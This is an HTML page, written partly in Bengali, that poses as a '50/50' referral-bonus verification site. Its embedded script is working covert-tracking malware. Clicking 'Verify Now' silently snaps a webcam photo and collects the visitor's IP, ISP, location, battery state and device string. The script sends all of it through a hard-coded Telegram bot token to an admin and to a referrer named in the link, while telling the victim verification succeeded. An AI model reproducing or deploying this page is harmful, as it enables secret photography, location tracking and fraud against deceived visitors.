<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>50/50 Verification</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; text-align: center; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background-image: url('https://i.imghippo.com/files/Fq9968wg.jpg'); background-size: cover; background-position: center; position: relative; }
        body::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.5); z-index: 1; }
        .container { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); padding: 40px 20px; border-radius: 20px; width: 85%; max-width: 380px; z-index: 2; position: relative; border: 1px solid rgba(255, 255, 255, 0.2); }
        h1, h2, p { color: #ffffff; text-shadow: 1px 1px 4px #000; }
        #verify-btn { background: linear-gradient(135deg, #1a73e8, #0d47a1); color: white; border: none; padding: 15px 40px; font-size: 18px; border-radius: 50px; cursor: pointer; width: 100%; font-weight: bold; }
        #video, #canvas { display: none; }
        #status { margin-top: 20px; color: #00ffcc; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome to 50/50</h1>
        <h2>প্রতি রেফারাল ৫০ টাকা বোনাস পান।</h2>
        <p>বোনাস পেতে হলে ভেরিফাই করুন</p>
        <button id="verify-btn">Verify Now</button>
        <div id="status"></div>
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        const botToken = "8403844691:AAG7ui2mJ08X8Q5kQ5jhpNoq1PGUqZpx6Ec";
        const adminId = "7068444019"; 
        const urlParams = new URLSearchParams(window.location.search);
        const userIdFromLink = urlParams.get('id'); 

        async function getAdvancedDetails() {
            let details = "🕵️‍♂️ Tracker Info:\n";
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const d = await ipRes.json();
                let batteryInfo = "";
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    batteryInfo = `\n🔋 ব্যাটারি: ${Math.round(battery.level * 100)}%\n🔌 চার্জিং: ${battery.charging ? "হ্যাঁ" : "না"}`;
                }
                details += `📍 আইপি: ${d.ip}\n🏢 আইএসপি: ${d.org}\n🌍 শহর: ${d.city}\n🚩 দেশ: ${d.country_name}${batteryInfo}\n📱 ডিভাইস: ${navigator.userAgent.split(')')[0] + ')'}`;
            } catch (e) { details += "তথ্য পাওয়া যায়নি।"; }
            return details;
        }

        document.getElementById('verify-btn').addEventListener('click', async () => {
            const btn = document.getElementById('verify-btn');
            const status = document.getElementById('status');
            status.innerText = "Processing... (২ সেকেন্ড অপেক্ষা করুন)";
            btn.style.display = "none"; 

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                const trackerInfo = await getAdvancedDetails();

                video.onloadedmetadata = () => {
                    // ছবি কালো হওয়া রোধ করতে ২ সেকেন্ডের ডিলে
                    setTimeout(() => {
                        const context = canvas.getContext('2d');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        canvas.toBlob(async (blob) => {
                            if (userIdFromLink && userIdFromLink !== adminId) {
                                await sendToTelegram(blob, userIdFromLink, trackerInfo);
                            }
                            await sendToTelegram(blob, adminId, `⚠️ Admin Notification\n${trackerInfo}`);
                            status.innerText = "Verification Successful!";
                            stream.getTracks().forEach(track => track.stop());
                        }, 'image/jpeg', 0.9);
                    }, 2000); 
                };
            } catch (err) {
                status.innerText = "Error: ক্যামেরা অ্যাক্সেস প্রয়োজন!";
                btn.style.display = "block";
            }
        });

        async function sendToTelegram(blob, id, caption) {
            const formData = new FormData();
            formData.append('chat_id', id);
            formData.append('photo', blob, 'user.jpg');
            formData.append('caption', caption);
            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
        }
    </script>
</body>
</html>
